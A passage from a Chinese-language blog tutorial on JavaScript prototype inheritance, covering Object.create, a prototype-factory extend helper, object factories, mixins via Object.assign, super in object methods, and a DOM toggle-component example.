class="line">&#125;);</span><br></pre></td></tr></table></figure><p>所以，最后，当我们需要构造函数继承时，需要以下三个步骤</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//继承</span></span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="title class_">Father</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//恢复原有构造函数</span></span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = <span class="title class_">Son</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// * 禁止自定义函数原型的constructor被遍历</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span>, <span class="string">&#x27;constructor&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">value</span>: <span class="title class_">Son</span>,</span><br><span class="line">  <span class="attr">enumerable</span>: <span class="literal">false</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h1 id="父类构造函数初始化属性"><a href="#父类构造函数初始化属性" class="headerlink" title="父类构造函数初始化属性"></a>父类构造函数初始化属性</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">User</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">age</span> = age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">User</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">show</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`我叫<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>， 我今年<span class="subst">$&#123;<span class="variable language_">this</span>.age&#125;</span>岁了`</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上面是我们定义的一个父类构造函数，也就是说，有一个构造函数会继承它</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Admin</span>(<span class="params"></span>) &#123;&#125;</span><br></pre></td></tr></table></figure><p>如何正确继承，哎对了，三步走实现继承</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Admin</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="title class_">User</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Admin</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = <span class="title class_">Admin</span>;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="title class_">Admin</span>.<span class="property"><span class="keyword">prototype</span></span>, <span class="string">&#x27;constructor&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">value</span>: <span class="title class_">Admin</span>,</span><br><span class="line">  <span class="attr">enumerable</span>: <span class="literal">false</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>然后，我们现在想让Admin不用自定义的同时也可以同User一样初始化对象（name、age），怎么实现呢</p><p>前面有讲过的，改变User的this指向不就可以实现了吗</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Admin</span>(<span class="params">...args</span>) &#123;</span><br><span class="line">  <span class="title class_">User</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过args传值同时改变User实例化的this指向，从而实现Admin同User一样初始化属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> mayun = <span class="keyword">new</span> <span class="title class_">Admin</span>(<span class="string">&#x27;mayun&#x27;</span>, <span class="number">22</span>);</span><br><span class="line">mayun.<span class="title function_">show</span>();</span><br></pre></td></tr></table></figure><p>正确输出啦</p><h1 id="原型工厂封装属性"><a href="#原型工厂封装属性" class="headerlink" title="原型工厂封装属性"></a>原型工厂封装属性</h1><p>每次对构造函数原型进行继承，都要三步走，是不是有点麻烦，要是多个构造函数原型都要继承，岂不是要写很多次，所以我们把它给封装了吧，这样每次就可以直接调用啦</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">extend</span>(<span class="params">child, dad</span>) &#123;</span><br><span class="line">  child.<span class="property"><span class="keyword">prototype</span></span> = <span class="title class_">Object</span>.<span class="title function_">create</span>(dad.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line">  child.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = child;</span><br><span class="line">  <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(child, <span class="string">&#x27;constructor&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">value</span>: child,</span><br><span class="line">    <span class="attr">enumerable</span>: <span class="literal">false</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>封装后的函数也称为原型工厂，我们来看看它的使用方法把</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">extend</span>(<span class="title class_">Son</span>, <span class="title class_">Father</span>);</span><br></pre></td></tr></table></figure><p>OK，这样子每次继承就不会很麻烦了，直接调用该函数即可</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">extend</span>(<span class="title class_">Daughter</span>, <span class="title class_">Father</span>);</span><br></pre></td></tr></table></figure><h1 id="对象工厂派生对象实现继承"><a href="#对象工厂派生对象实现继承" class="headerlink" title="对象工厂派生对象实现继承"></a>对象工厂派生对象实现继承</h1><p>我们之前已经了解过Object.create()可以实现对象继承，现在让我们来封装一个函数，来理解下构造函数实例化对象的原理，从而实现继承吧</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">User</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">age</span> = age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">User</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">show</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">name</span> + <span class="string">&#x27; is &#x27;</span> + <span class="variable language_">this</span>.<span class="property">age</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先我们有这么一个构造函数，我们想用它创造出许多子对象（类似于构造函数初始化），如何实现呢</p><p>第一步便是克隆出构造函数原型对象（creat）</p><p>第二步初始化对象(call、apply（前面刚讲过）)</p><p>第三步便是返回这个对象啦</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对象工厂造对象</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">admin</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> instance = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="title class_">User</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line">  <span class="title class_">User</span>.<span class="title function_">call</span>(instance, name, age);</span><br><span class="line">  <span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来实例化看看吧</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> dy = <span class="title function_">admin</span>(<span class="string">&#x27;dy&#x27;</span>, <span class="number">18</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dy.<span class="title function_">show</span>())</span><br></pre></td></tr></table></figure><p>成功！</p><h1 id="使用mixin实现多继承"><a href="#使用mixin实现多继承" class="headerlink" title="使用mixin实现多继承"></a>使用mixin实现多继承</h1><p>在上面，我们了解到了可以借用其他原型链上的方法满足需求，但有没有其它方式可以使用其它原型链的方法呢。</p><p>“这个我知道，继承那个原型不就好嘛”，哎哟，好像有点道理哦，但这样却可能会导致继承的混乱。</p><p>我们知道，原型链为线形的，也就是说，你只能单向继承，大白话就是你只能有一个亲生爸爸，而如果这时候，跟上面的需求一样，arr数组想用Math对象中的方法时怎么办，</p><p>有小朋友提到了，我可以让Math当Array的爸爸嘛，这样顺着一条原型链上去就能实现方法了嘛，是的没错，但你有没有想过在这个过程中，只是你一个数组需要用到Math中的方法，如果其他数组不需要呢，那么它们也没办法，依然会被绑定到这条原型链上，这样就会造成这条原型链混乱且复杂。</p><p>我们更加希望，事物是有序的，一条继承链下来，对象之间都是有需求的，都是相关联且合理的，所以，这个方法并不可取</p><p>那么有什么方法可以实现这一需求呢：mixin思想，我们使用混入来实现类似多继承的效果，从而使得原原型链（主干）不受影响</p><p>这里要用到Object的一个方法实现类似mixin的思想</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(obj1, obj2);</span><br></pre></td></tr></table></figure><p>首先创造一个事物构造函数还有其原型的一个方法show</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Thing</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Thing</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">show</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`我叫`</span> + <span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后创造两个事物构造函数分别继承它，extend详见上面的原型工厂继承</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Human</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="title class_">Thing</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">extend</span>(<span class="title class_">Human</span>, <span class="title class_">Thing</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Car</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="title class_">Thing</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">extend</span>(<span class="title class_">Car</span>, <span class="title class_">Thing</span>);</span><br></pre></td></tr></table></figure><p>然后实例化对象并验证下是否继承到了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> xiaohong = <span class="keyword">new</span> <span class="title class_">Human</span>(<span class="string">&#x27;xiaohong&#x27;</span>);</span><br><span class="line">xiaohong.<span class="title function_">show</span>();</span><br><span class="line"><span class="keyword">let</span> benchi = <span class="keyword">new</span> <span class="title class_">Car</span>(<span class="string">&#x27;banchi&#x27;</span>);</span><br><span class="line">benchi.<span class="title function_">show</span>();</span><br></pre></td></tr></table></figure><p>很幸运，可以使用父类方法展示自己（我叫xiaohong，我叫banchi）</p><p>然后我们创建一个行为类action</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> action = &#123;</span><br><span class="line">  <span class="title function_">move</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span> + <span class="string">&#x27;给我跑&#x27;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title function_">call</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span> + <span class="string">&#x27;给我叫&#x27;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们想让benchi和xiaohong都能使用这个类中的方法，但是他们已经有爹地了，这时候我们用mixin思想实现</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(benchi, action);</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(xiaohong, action);</span><br></pre></td></tr></table></figure><p>然后就执行方法吧</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">benchi.<span class="title function_">move</span>(); <span class="comment">//banchi给我跑</span></span><br><span class="line">xiaohong.<span class="title function_">call</span>(); <span class="comment">//xiaohong给我叫</span></span><br></pre></td></tr></table></figure><p>成功！我们实现了类似多继承</p><h1 id="mixin的内部继承以及super"><a href="#mixin的内部继承以及super" class="headerlink" title="mixin的内部继承以及super"></a>mixin的内部继承以及super</h1><p>还是依照上面的例子，我们想让mixin内部的对象实现继承且，banchi和xiaohong可以调用得到，如何实现嘞</p><p>假设有个todo类，想让它当action的爸爸</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> todo = &#123;</span><br><span class="line">  <span class="title function_">doing</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;在 &#x27;</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其实还是和前面一样的继承，让action的__proto__继承todo即可</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action.<span class="property">__proto__</span> = todo;</span><br></pre></td></tr></table></figure><p>这样便成功继承，然后我们稍微修改下action里面的方法，使得它可以调用父类todo的方法，这里我们用到<strong>super</strong>关键字</p><blockquote><p>super === this(action).__proto__（this指<strong>当前定义</strong>的对象）</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> action = &#123;</span><br><span class="line">  <span class="title function_">move</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">show</span>() + <span class="string">&#x27;，我&#x27;</span> + <span class="variable language_">super</span>.<span class="title function_">doing</span>() + <span class="string">&#x27;跑&#x27;</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title function_">call</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">show</span>() + <span class="string">&#x27;，我&#x27;</span> + <span class="variable language_">super</span>.<span class="title function_">doing</span>() + <span class="string">&#x27;叫&#x27;</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后同上面一样运行一下，结果也是正常显示啦</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(benchi.<span class="title function_">move</span>());</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(xiaohong.<span class="title function_">call</span>());</span><br></pre></td></tr></table></figure><p>我们来看一下他们之间的继承关系（可以多画画这种继承图帮助理解）</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2021/08/22/%E5%8E%9F%E5%9E%8B/mixin%E6%8C%87%E5%90%91.png" alt="mixin指向"></p><p>好哒，这一部分我们就了解了mixin内部继承以及super代替原型（son.__proto__）这两个重要的知识点啦</p><h1 id="继承操作Dom（综合案例）"><a href="#继承操作Dom（综合案例）" class="headerlink" title="继承操作Dom（综合案例）"></a>继承操作Dom（综合案例）</h1><p>现在有这样一个需求，我们有三个几乎一样的组件，我们想让他们的功能一致，只是样式稍微不同而已，如下图所示</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2021/08/22/%E5%8E%9F%E5%9E%8B/image-20210528214206292.png" alt="image-20210528214206292"></p><p>三者都是点击切换按钮切换状态语且改变背景颜色，点击隐藏，下面的状态语模块消失，同时按钮提示语改变，开始动手吧</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2021/08/22/%E5%8E%9F%E5%9E%8B/image-20210528214431075.png" alt="image-20210528214431075"></p><p>样式不说，直接上核心代码</p><p>首先创造动作构造函数，并且定义三个方法——隐藏、显示、背景颜色以及提示语改变</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Animation</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"><span class="title class_">Animation</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">hide</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title class_">Animation</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">show</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;block&#x27;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title class_">Animation</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">change</span> = <span class="keyword">function</span> (<span class="params">color, value</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">style</span>.<span class="property">backgroundColor</span> = color;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">innerHTML</span> = value;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>创造APP构造函数用于创建展示模块</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params">id, data=&#123;&#125;</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">div</span> = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(id);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">btnS</span> = <span class="variable language_">this</span>.<span class="property">div</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;[name=&quot;switch&quot;]&#x27;</span>);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">btnH</span> = <span class="variable language_">this</span>.<span class="property">div</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;[name=&quot;hide&quot;]&#x27;</span>);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">sec</span> = <span class="variable language_">this</span>.<span class="property">div</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;[name=&quot;sec&quot;]&#x27;</span>);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">data</span> = <span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;</span><br><span class="line">    <span class="attr">color</span>: [<span class="string">&#x27;#8e44ad&#x27;</span>, <span class="string">&#x27;#16a085&#x27;</span>], </span><br><span class="line">    <span class="attr">value</span>: [<span class="string">&#x27;你好&#x27;</span>, <span class="string">&#x27;再见&#x27;</span>],</span><br><span class="line">    <span class="attr">tog</span>: <span class="literal">true</span>, <span class="comment">//用于记录切换状态</span></span><br><span class="line">  &#125;,data)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>让它继承于动作构造函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">extend</span>(<span class="title class_">App</span>, <span class="title class_">Animation</span>);</span><br></pre></td></tr></table></figure><p>接着为两个按钮注册点击事件，同时调用父类的显示隐藏以及切换背景方法</p><p>显示隐藏切换</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">App</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">changeIf</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">btnH</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">btnH</span>.<span class="property">value</span> === <span class="string">&#x27;隐藏&#x27;</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">hide</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>.<span class="property">sec</span>);</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">btnH</span>.<span class="property">value</span> = <span class="string">&#x27;显示&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">show</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>.<span class="property">sec</span>);</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">btnH</span>.<span class="property">value</span> = <span class="string">&#x27;隐藏&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>状态语切换</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">App</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toggle</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">btnS</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">tog</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">change</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>.<span class="property">sec</span>, <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">color</span>[<span class="number">1</span>], <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">value</span>[<span class="number">1</span>]);</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">tog</span> = !<span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">tog</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">change</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>.<span class="property">sec</span>, <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">color</span>[<span class="number">0</span>], <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">value</span>[<span class="number">0</span>]);</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">tog</span> = !<span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">tog</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>以及首次打开页面的初始化方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">App</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">init</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">show</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>.<span class="property">sec</span>)</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">change</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>.<span class="property">sec</span>, <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">color</span>[<span class="number">0</span>], <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">value</span>[<span class="number">0</span>])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后就是执行这三个方法的启动函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">App</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">run</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">toggle</span>();</span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">changeIf</span>();</span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">init</span>()</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后就可以实例化对象，调用run方法啦</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> div1 = <span class="keyword">new</span> <span class="title class_">App</span>(<span class="string">&#x27;#app1&#x27;</span>, &#123;</span><br><span class="line"> <span class="attr">color</span>: [<span class="string">&#x27;#27ae60&#x27;</span>, <span class="string">&#x27;#2980b9&#x27;</span>],</span><br><span class="line"> <span class="attr">value</span>: [<span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;bye&#x27;</span>] </span><br><span class="line">&#125;);</span><br><span class="line">div1.<span class="title function_">run</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> div2 = <span class="keyword">new</span> <span class="title class_">App</span>(<span class="string">&#x27;#app2&#x27;</span>);</span><br><span class="line">div2.<span class="title 